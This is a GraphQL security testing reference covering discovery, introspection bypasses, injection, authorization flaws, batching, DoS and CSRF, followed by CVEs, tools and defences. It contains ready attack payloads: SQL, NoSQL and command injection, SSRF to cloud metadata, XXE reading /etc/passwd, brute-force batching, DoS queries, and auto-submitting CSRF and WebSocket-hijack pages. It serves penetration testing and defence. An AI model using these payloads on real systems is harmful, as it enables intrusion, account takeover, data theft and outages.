# GraphQL Security Reference

**Purpose:** Comprehensive reference for testing GraphQL API security — discovery, introspection, schema recovery, injection, authorization flaws, batching, DoS, subscriptions, CSRF, and engine-specific quirks.

**Schema version:** 1  
**Skill version:** paladin-probe@v3

---

## Table of Contents

1. [Discovery & Fingerprinting](#1-discovery--fingerprinting)
2. [Introspection](#2-introspection)
3. [Schema Recovery Without Introspection](#3-schema-recovery-without-introspection)
4. [Injection Through GraphQL](#4-injection-through-graphql)
5. [Authorization Flaws](#5-authorization-flaws)
6. [Batching Attacks & Aliases](#6-batching-attacks--aliases)
7. [Denial of Service](#7-denial-of-service)
8. [CSRF & CSWSH](#8-csrf--cswsh)
9. [Subscriptions & WebSockets](#9-subscriptions--websockets)
10. [Engine-Specific Notes](#10-engine-specific-notes)
11. [Notable CVEs](#11-notable-cves)
12. [Tooling](#12-tooling)
13. [Payload Quick Reference](#13-payload-quick-reference)
14. [Detection & Prevention](#14-detection--prevention)

---

## 1. Discovery & Fingerprinting

### Common Endpoints

```
/graphql              /api/graphql          /v1/graphql
/graphiql             /graphql/api          /v2/graphql
/graphql/console      /graphql.php          /graphql/v1
/explorer             /v1/explorer          /api
```

Probe each with universal query: `query{__typename}` — response includes `{"data":{"__typename":"query"}}`.

### Request Methods

- POST with `Content-Type: application/json` — standard
- GET with URL-encoded query — `?query=...`
- POST with `Content-Type: application/x-www-form-urlencoded` — CSRF risk

### Engine Fingerprinting

| Engine | Header / Hint |
|--------|---------------|
| Apollo Server | `X-Powered-By: Express` + `apollo-*` headers |
| graphql-js | `X-GraphQL-Event-Stream` on subscriptions |
| Hasura | `x-hasura-role`, `x-hasura-admin-secret` |
| WPGraphQL | `X-Powered-By: WPGraphQL` |
| Mercurius | `content-type: application/graphql-response+json` |

Tools: `graphw00f` (dolevf/graphw00f) for passive engine identification.

---

## 2. Introspection

### Full Introspection Query

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives { name description args { ...InputValue } }
  }
}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) {
    name description args { ...InputValue }
    type { ...TypeRef }
    isDeprecated deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue {
  name description type { ...TypeRef } defaultValue
}
fragment TypeRef on __Type {
  kind name ofType {
    kind name ofType {
      kind name ofType { kind name }
    }
  }
}
```

### Compact Single-Line Introspection

```graphql
{__schema{queryType{name},mutationType{name},types{kind,name,fields{name,args{name,type{name,ofType{name}}},type{name,ofType{name}}}}}}
```

### Bypassing Introspection Defenses

| Technique | Payload / Method |
|-----------|------------------|
| Newline after `__schema` | `query{__schema\n{queryType{name}}}` |
| Comma injection | `query{__schema,{queryType{name}}}` |
| GET request bypass | `GET /graphql?query=query{__schema{types{name}}}` |
| x-www-form-urlencoded | POST with `Content-Type: application/x-www-form-urlencoded`, body `query=...` |
| Batch query wrapper | `[{"query":"{__schema{types{name}}}"}]` |

---

## 3. Schema Recovery Without Introspection

### Field Suggestions (Apollo)

Send an invalid field name — if suggestions are enabled, the error reveals valid names:

```json
{"message": "Cannot query field \"usr\" on type \"Query\". Did you mean \"user\"?"}
```

Tool: `Clairvoyance` (nikitastupin/clairvoyance) automates schema recovery from suggestions.

### Error Oracle

Probe with partial queries and observe error messages that leak type/field info:

```graphql
{user(id: "")}                    # may reveal expected type
{user(id: null)}                  # nullability info
{user}                            # missing required arg error
```

### Passive Capture

- Intercept SPA traffic (GraphQL queries in JS bundles)
- Look for persisted query hashes in Apollo Client (`extensions.persistedQuery.sha256Hash`)
- Extract from source maps

---

## 4. Injection Through GraphQL

### SQL Injection

```graphql
# Smoke test
{user(id: "1' OR '1'='1") { id name email }}

# Time-based
{user(id: "1'; SELECT pg_sleep(5);--") { id }}

# UNION extraction
{user(id: "1 UNION SELECT username,password FROM admins--") { id name }}
```

### NoSQL Injection (MongoDB)

```graphql
# Regex injection
{doctors(search: "{\"ssn\": {\"$regex\": \".*\"}}") { firstName lastName ssn }}

# $ne bypass
{user(where: {email: "admin@test.com", password: {"$ne": ""}}) { token }}

# $gt timestamp enumeration
{pastes(where: {createdAt: {"$gt": "2024-01-01"}}) { content }}
```

### OS Command Injection

```graphql
mutation {
  uploadAvatar(url: "http://example.com/;id") { success }
  processImage(path: "/uploads/;cat /etc/passwd") { output }
}
```

### SSRF

```graphql
mutation {
  importData(url: "http://169.254.169.254/latest/meta-data/") { status }
  fetchProfile(avatarUrl: "http://internal-admin:8080/") { url }
}
```

### XXE

```graphql
mutation {
  parseXML(data: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>") { result }
}
```

### SSTI

```graphql
mutation {
  renderTemplate(template: "{{7*7}}") { output }
  generateReport(format: "{{config.__class__.__init__.__globals__}}") { url }
}
```

---

## 5. Authorization Flaws

### BOLA / IDOR

```graphql
# Missing object-level authorization
query { user(id: "3") { email role ssn } }
query { payment(id: "private-123") { amount cardLast4 } }
```

### BFLA (Broken Function-Level Auth)

```graphql
# Privilege escalation via mutation
mutation { deleteUser(id: "5") { success } }
mutation { updateRole(userId: "2", role: "admin") { user { role } } }
```

### Field-Level Auth Gaps

Check each sensitive field individually — resolver may check auth on `email` but leak `ssn`:

```graphql
query { user(id: "1") { name ssn role internalNotes } }
```

### Mass Assignment

```graphql
mutation {
  updateUser(id: "1", input: {role: "admin", isVerified: true, credits: 999999}) { id role }
}
```

### Node/Edge Auth Drift

Relay connections may enforce authorization on `edges` but not on `node` path:

```graphql
query { allUsers { edges { node { email } } } }
```

---

## 6. Batching Attacks & Aliases

### JSON-Array Batching

Multiple operations in a single HTTP request:

```json
[
  {"query": "mutation { login(pass: \"pass1\", user: \"admin\") { token } }"},
  {"query": "mutation { login(pass: \"pass2\", user: \"admin\") { token } }"},
  {"query": "mutation { login(pass: \"pass3\", user: \"admin\") { token } }"}
]
```

### Alias-Based Batching

```graphql
mutation {
  a1: login(pass: "pass1", user: "admin") { token }
  a2: login(pass: "pass2", user: "admin") { token }
  a3: login(pass: "pass3", user: "admin") { token }
}
```

### Query-Name Batching

```graphql
query {
  qname: Query { field1 }
  qname1: Query { field1 }
}
```

### Use Cases

- Password brute-force amplification (bypasses per-request rate limits)
- 2FA/OTP brute-force
- Token enumeration
- IDOR brute-force over user/object IDs

---

## 7. Denial of Service

### Depth Attack

Exploits recursive or deeply nested types:

```graphql
query {
  user {
    friends { friends { friends { friends {
      friends { friends { friends { friends {
        # continue to 20+ levels
      } } } }
    } } } }
  }
}
```

### Amount Attack

Requests massive list sizes:

```graphql
query {
  users(first: 99999999) { edges { node { id name email posts { title } } } }
}
```

### Alias Amplification

Repeating the same resolver via aliases:

```graphql
query {
  a1: expensiveField { data }
  a2: expensiveField { data }
  # 1000+ aliases
  a1000: expensiveField { data }
}
```

### Field Duplication (No Alias)

Some engines process duplicate fields without extra alias cost:

```graphql
query { user { x x x x x } }
```

### Directive Overload

```graphql
query {
  user @a @b @c @d @e @f @g @h @i @j {
    name
  }
}
```

### Circular Fragment

```graphql
fragment F on User { id friends { ...F } }
query { user(id: "1") { ...F } }
```

### Regex/Evil Input in String Fields

```graphql
mutation { search(query: "(a|aa|aaa|aaaa|aaaaa)*b") { results } }
```

### Introspection DoS

```graphql
{__schema{types{name,fields{name,type{name,ofType{name,ofType{name}}}}}}
```

Repeatedly with deep nesting.

---

## 8. CSRF & CSWSH

### HTTP CSRF

Exploited when endpoint accepts `application/x-www-form-urlencoded` or GET:

```html
<html>
  <body>
    <form action="https://target.com/graphql" method="POST">
      <input type="hidden" name="query" value="mutation { transfer(amount: 1000, to: \"attacker\") { success } }" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

### CSWSH (Cross-Site WebSocket Hijacking)

```javascript
<html>
  <script>
    var ws = new WebSocket('wss://target.com/graphql');
    ws.onopen = function() {
      ws.send('{"query":"subscription { sensitiveEvents { data }}"}');
    };
  </script>
</html>
```

### Detection

```bash
# Test GET
curl "http://target.com/graphql?query=mutation{logout{success}}"

# Test x-www-form-urlencoded
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "query=mutation{logout{success}}"

# Check missing Origin/Referer validation
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Origin: https://evil.com" \
  -d '{"query":"mutation{logout{success}}"}'
```

---

## 9. Subscriptions & WebSockets

### Attack Surface

- Authorization checked on connection but not per-event
- No CSRF protection on WebSocket upgrade
- Subscription messages bypass query-level rate limiting
- Data leakage via real-time feeds

### Probe

```javascript
var ws = new WebSocket('wss://target.com/graphql');
ws.onopen = function() {
  ws.send(JSON.stringify({
    type: "subscribe",
    id: "1",
    payload: { query: "subscription { allMessages { sender content } }" }
  }));
};
```

### Per-Event Authorization

Test: connect as user A, subscribe to events that should only fire for user B.

---

## 10. Engine-Specific Notes

| Engine | Key Quirks |
|--------|------------|
| Apollo Server v3/v4 | `introspection: false` to disable; `hideSchemaDetailsFromClientErrors` for suggestions; `allowBatchedHttpRequests: true` enables JSON-array batching |
| graphql-js / express-graphql | No built-in depth/amount limiting; verbose errors by default; GraphiQL enabled if `graphiql: true` |
| Hasura | Admin secret `x-hasura-admin-secret`; role-based with `x-hasura-role`; permissions per role/table; metadata API may leak schemas |
| graphql-java | MaxQueryDepthInstrumentation / MaxQueryComplexityInstrumentation; GraphQL Java 21+ has built-in limits |
| HotChocolate (.NET) | `UseInstrumentation()`; cost analysis via `UseCostAnalyzer()`; `IHttpResultSerializer` for error masking |
| async-graphql (Rust) | Directive overload DoS (CVE-2024-47614); complex cost analysis setup |
| Mercurius (Fastify) | `subscriptionLazyLoad` setting; subscription frame crash (CVE-2023-22477) |
| WPGraphQL (WP) | Often runs with introspection enabled; wraps existing WP user model |

---

## 11. Notable CVEs

| CVE / Report | Impact | Notes |
|--------------|--------|-------|
| CVE-2024-50311 | DoS via alias batching | Red Hat OpenShift GraphQL |
| CVE-2024-50312 | Introspection info disclosure | Schema exposure |
| CVE-2024-40094 | Depth/complexity bypass | graphql-java instrumentation |
| CVE-2024-47614 | DoS via directive overload | async-graphql (Rust) |
| CVE-2024-54147 | WSS TLS validation | Altair GraphQL desktop MITM |
| CVE-2023-38503 | Subscription authZ bypass | Directus |
| CVE-2023-22477 | DoS subscription frame | Mercurius |
| CVE-2023-0921 | Expensive query CPU spike | GitLab GraphQL |
| CVE-2025-53364 | Public schema access | Parse Server GraphQL |
| H1-435066 | SQLi via GraphQL | Jobert Abma — HackerOne |
| H1-489146 | Edge/node auth drift | Node path bypassed edge checks |
| Google RCE (Landh.tech) | Directive overload | $50,000 bounty |

---

## 12. Tooling

### Recon & Fingerprinting

| Tool | Purpose |
|------|---------|
| graphw00f | Passive engine fingerprinting |
| graphql-path-enum | Enumerate paths to target types |
| Clairvoyance | Schema recovery via suggestions |

### Attack Tools

| Tool | Purpose |
|------|---------|
| GraphQLmap | Interactive exploitation |
| InQL (Burp) | GraphQL security testing in Burp |
| CrackQL | Brute-force via batching |
| BatchQL (Assetnote) | Introspection, batching, CSRF detection |
| graphql-cop | Security auditor utility |

### Defensive

| Library | Purpose |
|---------|---------|
| graphql-depth-limit | Max nesting depth |
| graphql-query-complexity / graphql-validation-complexity | Cost analysis |
| graphql-shield | Permission layer per field |
| graphql-armor | Query cost, depth, alias limits |

---

## 13. Payload Quick Reference

```graphql
# Existence probe
query{__typename}

# Introspection probe
query{__schema{queryType{name}}}

# Single type inspection
{__type(name: "User") { name fields { name type { name kind } } }}

# Empty-string wildcard dump
query { users(first: 99999) { edges { node { email } } } }

# Alias batch brute-force
mutation { a1: login(user:"admin",pass:"pass1"){token} a2: ... }

# JSON-array batching
[{"query":"mutation{login(user:\"admin\",pass:\"pass1\"){token}}"}, ...]

# Depth DoS
query { user { friends { friends { friends { friends { name } } } } } }

# Amount DoS
query { users(first: 99999999) { edges { node { id } } } }

# Introspection DoS
query { __schema { types { name fields { name type { name ofType { name } } } } } }

# Directive overload
query { user @skip(if: false) @include(if: true) @deprecated { name } }

# CSRF (x-www-form-urlencoded)
query=mutation{transfer(amount:1000,to:\"attacker\"){success}}

# SQLi smoke
query { user(id: "1' OR '1'='1") { name } }

# NoSQLi smoke
query { users(where: { email: { \"$regex\": \".*@admin.com\" } }) { id } }

# SSRF smoke
mutation { importData(url: "http://169.254.169.254/latest/meta-data/") { status } }

# Subscription probe
{"type":"subscribe","id":"1","payload":{"query":"subscription { events { data } }"}}
```

---

## 14. Detection & Prevention

### Design-Time

- Define authz per resolver, not just at gateway
- Use persisted queries (APQ) for public APIs
- Set complexity budgets per operation type
- Never expose internal type names via description fields

### Build-Time

- SAST rules: extract GraphQL resolver patterns
- Disallow template literals in resolver DB queries
- Require depth/complexity limit tests in CI
- Audit schema for leaked internal fields

### Runtime

- Disable introspection in production
- Disable field suggestions (`hideSchemaDetailsFromClientErrors`)
- Limit max batch size (JSON array length)
- Enforce cost-based rate limiting per user/ip
- Validate content-type as `application/json` only
- Enforce Origin/Referer checks on mutations
- Cap alias count per query

### Detection Signals

- Single IP with large batch queries (JSON arrays > 5 operations)
- Queries exceeding 10 aliases per request
- Non-standard content types on GraphQL endpoint
- `__schema` or `__type` in query (should be 4xx in production)
- Subscription connections from unexpected Origins

### YAML Fingerprint Table

```yaml
graphql_introspection_enabled:
  probe: 'query{__schema{queryType{name}}}'
  detection: 200 response with queryType name
graphql_suggestions_enabled:
  probe: 'query{invalidFieldName}'
  detection: error contains "Did you mean"
graphql_batching_enabled:
  probe: '[{"query":"query{__typename}"},{"query":"query{__typename}"}]'
  detection: 200 with 2-element array response
graphql_get_accepted:
  probe: 'GET /graphql?query=query{__typename}'
  detection: 200 with data
graphql_xwwwform_accepted:
  probe: 'POST /graphql Content-Type: application/x-www-form-urlencoded body: query=query{__typename}'
  detection: 200 with data
graphql_no_csrf_token:
  probe: 'POST /graphql with Origin: https://evil.com'
  detection: missing csrf token enforcement, mutation succeeds
```
